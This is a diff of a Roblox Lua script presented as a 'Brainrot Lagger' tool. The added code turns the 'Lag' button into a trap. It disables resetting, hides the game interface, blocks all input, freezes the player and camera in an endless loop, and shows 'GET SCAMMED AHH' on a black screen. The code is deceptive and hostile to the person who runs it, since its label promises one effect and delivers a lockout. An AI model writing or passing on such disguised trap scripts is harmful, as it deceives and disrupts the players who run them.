@@ -1,101 +1,152 @@
 --// Services
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local ContextActionService = game:GetService("ContextActionService")
+local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local camera = workspace.CurrentCamera
 
---// Create ScreenGui
+--// GUI
 local gui = Instance.new("ScreenGui")
-gui.Name = "LagGui"
-gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Name = "BrainrotLagger"
 
---// Main Frame (SMALLER)
-local mainFrame = Instance.new("Frame")
-mainFrame.Parent = gui
-mainFrame.Size = UDim2.new(0, 300, 0, 150)
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
-mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-mainFrame.BorderSizePixel = 0
+-- Main Panel
+local frame = Instance.new("Frame")
+frame.Parent = gui
+frame.Size = UDim2.new(0, 520, 0, 260)
+frame.Position = UDim2.new(0.5,-260,0.5,-130)
+frame.BackgroundColor3 = Color3.fromRGB(5,5,5)
+frame.BorderSizePixel = 0
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,30)
 
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 15)
+local stroke = Instance.new("UIStroke", frame)
+stroke.Thickness = 4
+stroke.Color = Color3.fromRGB(170,0,255)
 
-local stroke = Instance.new("UIStroke", mainFrame)
-stroke.Thickness = 2
-stroke.Color = Color3.fromRGB(170, 0, 255)
-
---// Title (SMALLER)
+-- Title
 local title = Instance.new("TextLabel")
-title.Parent = mainFrame
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 5)
+title.Parent = frame
+title.Size = UDim2.new(1,0,0,90)
+title.Position = UDim2.new(0,0,0,20)
 title.BackgroundTransparency = 1
 title.Text = "Brainrot Lagger"
-title.TextColor3 = Color3.fromRGB(80,120,255)
+title.TextColor3 = Color3.fromRGB(90,140,255)
 title.TextScaled = true
 title.Font = Enum.Font.Arcade
 
---// Button (SMALLER)
+-- Button
 local button = Instance.new("TextButton")
-button.Parent = mainFrame
-button.Size = UDim2.new(0, 160, 0, 55)
-button.Position = UDim2.new(0.5, -80, 0.5, 20)
-button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+button.Parent = frame
+button.Size = UDim2.new(0,260,0,100)
+button.Position = UDim2.new(0.5,-130,0.55,0)
+button.BackgroundColor3 = Color3.fromRGB(40,40,40)
 button.Text = "Lag"
-button.TextColor3 = Color3.fromRGB(100,150,255)
+button.TextColor3 = Color3.fromRGB(120,170,255)
 button.TextScaled = true
 button.Font = Enum.Font.Arcade
 button.BorderSizePixel = 0
+Instance.new("UICorner", button).CornerRadius = UDim.new(0,25)
 
-Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
+-------------------------------------------------
+-- DRAG SYSTEM
+-------------------------------------------------
+local dragging = false
+local dragInput, dragStart, startPos
 
---// Effects
-local blur = Instance.new("BlurEffect")
-blur.Size = 0
-blur.Parent = Lighting
+frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = frame.Position
+		
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
 
-local lagging = false
-local connection
+frame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
 
---// Fake 3 FPS Visual Lag (CLIENT ONLY)
-local function fakeLag()
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
 
-	if lagging then return end
-	lagging = true
-	button.Text = "3 FPS..."
+-------------------------------------------------
+-- FULL BLACK SCAM SCREEN
+-------------------------------------------------
+local function fullScam()
 
-	local fpsLimit = 1/3
-	local accumulator = 0
+	frame.Visible = false
 	
-	connection = RunService.RenderStepped:Connect(function(dt)
-		
-		accumulator += dt
-		
-		if accumulator >= fpsLimit then
-			accumulator = 0
-			
-			local offset = Vector3.new(
-				math.random(-4,4),
-				math.random(-4,4),
-				math.random(-4,4)
-			) * 0.5
-			
-			camera.CFrame = camera.CFrame * CFrame.new(offset)
-			blur.Size = math.random(20,40)
-		end
+	-- Disable reset button
+	pcall(function()
+		StarterGui:SetCore("ResetButtonCallback", false)
 	end)
 
-	task.wait(8)
-	
-	if connection then
-		connection:Disconnect()
+	-- Hide CoreGui
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+	end)
+
+	-- Freeze camera
+	camera.CameraType = Enum.CameraType.Scriptable
+	local frozenCFrame = camera.CFrame
+
+	-- Block all inputs
+	ContextActionService:BindAction(
+		"FreezeAll",
+		function()
+			return Enum.ContextActionResult.Sink
+		end,
+		false,
+		unpack(Enum.PlayerActions:GetEnumItems())
+	)
+
+	-- Freeze movement
+	if player.Character and player.Character:FindFirstChild("Humanoid") then
+		player.Character.Humanoid.WalkSpeed = 0
+		player.Character.Humanoid.JumpPower = 0
 	end
-	
-	blur.Size = 0
-	button.Text = "Lag"
-	lagging = false
+
+	-- Black Screen
+	local black = Instance.new("Frame")
+	black.Parent = gui
+	black.Size = UDim2.new(1,0,1,0)
+	black.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	black.BorderSizePixel = 0
+
+	local text = Instance.new("TextLabel")
+	text.Parent = black
+	text.Size = UDim2.new(1,0,1,0)
+	text.BackgroundTransparency = 1
+	text.Text = "GET SCAMMED AHH"
+	text.TextColor3 = Color3.fromRGB(255,0,0)
+	text.TextScaled = true
+	text.Font = Enum.Font.Arcade
+
+	-- Infinite freeze loop
+	while true do
+		camera.CFrame = frozenCFrame
+		task.wait()
+	end
 end
 
-button.MouseButton1Click:Connect(fakeLag)
+button.MouseButton1Click:Connect(fullScam)
